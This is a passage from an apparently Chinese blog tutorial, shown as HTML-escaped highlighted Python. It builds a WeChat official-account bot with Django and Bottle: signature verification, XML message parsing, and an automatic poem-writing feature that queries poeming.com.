            &lt;span class="n"&gt;hashstr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmpstr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;hashstr&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;echostr&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;django&lt;/code&gt;里这样写&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="c1"&gt;# -*- coding: utf-8 -*-  &lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.http&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;HttpResponse&lt;/span&gt;  
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;  

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;handleRequest&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;method&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;HttpResponse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;checkSignature&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="n"&gt;content_type&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;text/plain&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;  
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;  

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;checkSignature&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
        &lt;span class="n"&gt;TOKEN&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;your token&amp;quot;&lt;/span&gt; 
        &lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;signature&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
        &lt;span class="n"&gt;timestamp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;timestamp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
        &lt;span class="n"&gt;nonce&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;nonce&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
        &lt;span class="n"&gt;echoStr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;echostr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  

        &lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;TOKEN&lt;/span&gt;  
        &lt;span class="n"&gt;tmpList&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;timestamp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;  
        &lt;span class="n"&gt;tmpList&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="n"&gt;tmpstr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s%s%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nb"&gt;tuple&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmpList&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
        &lt;span class="n"&gt;tmpstr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmpstr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;tmpstr&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;echoStr&lt;/span&gt;  
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;  
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt; 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;你如果用的是django的话，我假设你已经熟悉它了，那么urls.py之类常规配置就不介绍了。&lt;/p&gt;
&lt;p&gt;好～&lt;br /&gt;
这样一来，我们的服务器就通过微信的认证了。&lt;br /&gt;
下面进入真正有趣的地方。处理用户的请求，并给予答复。  &lt;/p&gt;
&lt;h3&gt;案例学习，自动作诗&lt;/h3&gt;
&lt;p&gt;我对诗词比较感兴趣，那我们就来写一个自动作诗的微信公众号吧。一旦你熟悉的其中的逻辑，你可以发挥你的想象力，写个你自己感兴趣的公众号，思路和大多细节都是基本一样的。
直接上代码：(&lt;code&gt;bae&lt;/code&gt;环境下基于&lt;code&gt;bootle&lt;/code&gt;)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="c1"&gt;#! /usr/bin/env python&lt;/span&gt;
    &lt;span class="c1"&gt;# coding=utf-8&lt;/span&gt;
    &lt;span class="c1"&gt;#自动作诗&lt;/span&gt;
    &lt;span class="n"&gt;__author__&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wwj&amp;#39;&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bottle&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;hashlib&lt;/span&gt;
    &lt;span class="c1"&gt;#解析xml&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;xml.etree.ElementTree&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;ET&lt;/span&gt;
    &lt;span class="c1"&gt;#解析json，给客户端发送数据，用json格式&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;json&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;  &lt;span class="c1"&gt;#第三方库&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;BeautifulSoup&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;  &lt;span class="c1"&gt;#第三方库，bae下自带    &lt;/span&gt;


    &lt;span class="n"&gt;app&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Bottle&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="nd"&gt;@app.get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="c1"&gt;#url接口，接收微信的消息&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;check_signature&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="c1"&gt;#检验token，如果没有这个的话，该服务器会被微信验证失败&lt;/span&gt;
        &lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;your token&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;#set your token here&lt;/span&gt;
        &lt;span class="n"&gt;signature&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;signature&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
        &lt;span class="n"&gt;timestamp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;timestamp&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;nonce&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;nonce&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;echostr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;echostr&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;tmpList&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;timestamp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;nonce&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;tmpList&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sort&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="n"&gt;tmpstr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%s%s%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="nb"&gt;tuple&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmpList&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;hashstr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hashlib&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sha1&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;tmpstr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hexdigest&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;hashstr&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;signature&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;echostr&lt;/span&gt;
        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;None&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;parse_msg&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="c1"&gt;#解析来自微信的请求，request用于传递请求信息，这是bootle的知识，与微信无关，核心只是普通的url get部分内容&lt;/span&gt;
        &lt;span class="n"&gt;recvmsg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
        &lt;span class="n"&gt;root&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ET&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;fromstring&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;recvmsg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{}&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;child&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;tag&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;child&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;set_content&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&amp;#39;添加自动作诗模块，输入&amp;quot;诗词#登山&amp;quot;自动写作主题为登山的诗词,目前仅支持平水韵五绝，之后会添加其他体裁&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;content&lt;/span&gt;


    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;writepoetry&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;yb&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;tc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;mt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;u&amp;quot;无题&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="c1"&gt;#yb是韵部，tc是体裁，mt是命题&lt;/span&gt;
        &lt;span class="c1"&gt;#mt必须是u&lt;/span&gt;
        &lt;span class="n"&gt;cleanmt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mt&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GBK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;yb&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;yb&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;tc&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;tc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;mt&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;cleanmt&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.poeming.com/web/main.asp&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;cleandate&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;decode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;GBK&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;#现在是utf-8，在程序中保持为unicode,直到输出才化为utf-8&lt;/span&gt;
        &lt;span class="n"&gt;outdate&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;cleandate&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;utf-8&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
        &lt;span class="c1"&gt;#print outdate&lt;/span&gt;
        &lt;span class="n"&gt;soup&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BeautifulSoup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;outdate&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
        &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;soup&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;findAll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;p&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;#p是list&lt;/span&gt;
        &lt;span class="c1"&gt;#p[1]是主要内容&lt;/span&gt;
        &lt;span class="n"&gt;p_text&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;:]&lt;/span&gt; 
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;p_text&lt;/span&gt;
        &lt;span class="c1"&gt;##成功后的内容&lt;/span&gt;
        &lt;span class="c1"&gt;#p_list=p_text.split(u&amp;quot;。&amp;quot;)#使用句号分割取出&lt;/span&gt;
        &lt;span class="c1"&gt;#print &amp;#39;&amp;#39;.join(p_list[1:])&lt;/span&gt;
        &lt;span class="c1"&gt;#Out[8]: {&amp;#39;confidence&amp;#39;: 0.99, &amp;#39;encoding&amp;#39;: &amp;#39;GB2312&amp;#39;}&lt;/span&gt;
        &lt;span class="c1"&gt;#mypoetry=writepoetry(yb=&amp;quot;2&amp;quot;,tc=&amp;quot;1&amp;quot;,mt=u&amp;quot;无题&amp;quot;)&lt;/span&gt;




    &lt;span class="nd"&gt;@app.post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;response_msg&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
        &lt;span class="c1"&gt;#返回消息到客户端   &lt;/span&gt;
        &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;parse_msg&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; 
        &lt;span class="c1"&gt;#解析接收到的用户消息&lt;/span&gt;
        &lt;span class="c1"&gt;#处理文本消息，注意必须按照微信接口要求的格式，图片消息的话应该给出图片url,多参考别人的源码&lt;/span&gt;
        &lt;span class="n"&gt;textTpl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;xml&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                 &amp;lt;ToUserName&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/ToUserName&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                 &amp;lt;FromUserName&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/FromUserName&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                 &amp;lt;CreateTime&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/CreateTime&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                 &amp;lt;MsgType&amp;gt;&amp;lt;![CDATA[text]]&amp;gt;&amp;lt;/MsgType&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                 &amp;lt;Content&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/Content&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                 &amp;lt;FuncFlag&amp;gt;0&amp;lt;/FuncFlag&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                 &amp;lt;/xml&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;  
        &lt;span class="c1"&gt;#&amp;lt;MsgType&amp;gt;&amp;lt;![CDATA[text]]&amp;gt;&amp;lt;/MsgType&amp;gt;  这里不用%s才能显示关注？？&lt;/span&gt;
        &lt;span class="c1"&gt;#图片模板&lt;/span&gt;
        &lt;span class="n"&gt;pictextTpl&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;xml&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;ToUserName&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/ToUserName&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;FromUserName&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/FromUserName&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;CreateTime&amp;gt;&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;lt;/CreateTime&amp;gt;&lt;/span&gt;
